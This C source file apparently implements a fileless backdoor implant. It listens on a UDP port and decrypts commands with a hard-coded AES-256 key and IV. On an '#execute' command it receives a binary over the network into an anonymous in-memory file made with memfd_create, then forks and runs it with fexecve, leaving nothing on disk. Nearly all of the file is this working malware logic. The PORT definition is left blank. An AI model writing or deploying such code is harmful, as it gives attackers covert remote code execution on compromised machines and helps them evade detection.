#define _GNU_SOURCE
#include <time.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <linux/memfd.h>
#include <unistd.h>
#define MAX 2048 
#define MAX_ENC 2064
#define PORT 
#define SA struct sockaddr 

unsigned char *key = (unsigned char *)"kXMYK0nLhhqkCRwTbg5Fhvok2ANsTiWV";
unsigned char *iv = (unsigned char *)"5SmGalZA9FZJ7cij";

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int eencrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;
    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;
    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}


int main()
{
	int sockfd;
	int exec_fd; 
    	unsigned char buff[MAX];
	unsigned char enc_buff[MAX_ENC]; 
    	char *send_traffic = "#send"; 
    	struct sockaddr_in servaddr, cliaddr; 
	
	srand(time(NULL));
	char randomstring[6];
	      
    	// Creating socket file descriptor 
    	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        	exit(EXIT_FAILURE); 
    	} 
      
    	memset(&servaddr, 0, sizeof(servaddr)); 
    	memset(&cliaddr, 0, sizeof(cliaddr)); 
      
    	// Filling server information 
    	servaddr.sin_family    = AF_INET; // IPv4 
    	servaddr.sin_addr.s_addr = INADDR_ANY; 
    	servaddr.sin_port = htons(PORT); 
 	// Bind the socket with the server address 
    	if ( bind(sockfd, (const struct sockaddr *)&servaddr,  
            	sizeof(servaddr)) < 0 ) 
    	{ 
        	exit(EXIT_FAILURE); 
    	} 
      
    	int len, n; 
  
    	len = sizeof(cliaddr);  //len is value/resuslt 
  	for(;;)
	{
		char * execute_file_clength;
		long execute_file_length;
		char new_name[500];
		int count = 0;
		pid_t child_pid;
		bzero(new_name, 500);
		bzero(buff, MAX);
		bzero(enc_buff, MAX_ENC);
    		n = recvfrom(sockfd, (char *)enc_buff, MAX_ENC, MSG_WAITALL, ( struct sockaddr *) &cliaddr, &len);
		decrypt(enc_buff, MAX_ENC, key, iv, buff);
		if(strncmp(buff, "#execute", 8) == 0)
		{	
			int i = 0;
			for(i = 0; i < 6; ++i)
			{
				randomstring[i]='0' + rand()%72;
			}
			execute_file_clength = strtok(buff, " ");
			execute_file_clength = strtok(NULL, "\n");
			execute_file_length = atol(execute_file_clength);
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			recvfrom(sockfd, (char *)enc_buff, MAX_ENC, MSG_WAITALL, ( struct sockaddr *) &cliaddr, &len);
			decrypt(enc_buff, MAX_ENC, key, iv, buff);
			strcpy(new_name, buff);
			exec_fd = syscall(SYS_memfd_create, randomstring, MFD_CLOEXEC); 
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			strcpy(buff, send_traffic);
			eencrypt(buff, MAX, key, iv, enc_buff);
			sendto(sockfd, (const char *)enc_buff, MAX_ENC, MSG_CONFIRM, (const struct sockaddr *) &cliaddr, len);
			while(1)
			{
				usleep(1);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				recvfrom(sockfd, (char *)enc_buff, MAX_ENC, MSG_WAITALL, ( struct sockaddr *) &cliaddr, &len);
				decrypt(enc_buff, MAX_ENC, key, iv, buff);
				if(strncmp(buff, "#FILEEND", 8) == 0)
				{
					bzero(buff, MAX);
					bzero(enc_buff, MAX_ENC);
					break;
				}
				else{
					if((count+MAX) < execute_file_length)
					{
						write(exec_fd, buff, MAX);
						count += MAX;
					}
					else
					{
						write(exec_fd, buff, (execute_file_length - count));
					}		
				}
			}
			char *const args[] = {new_name, NULL};
			char *const envp[] = {"HOME=/", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

			child_pid = fork();
			if(child_pid == 0)
			{
				fexecve(exec_fd, args, envp);
			}
			else
			{

			}
		}
      	}
    	return 0; 
}
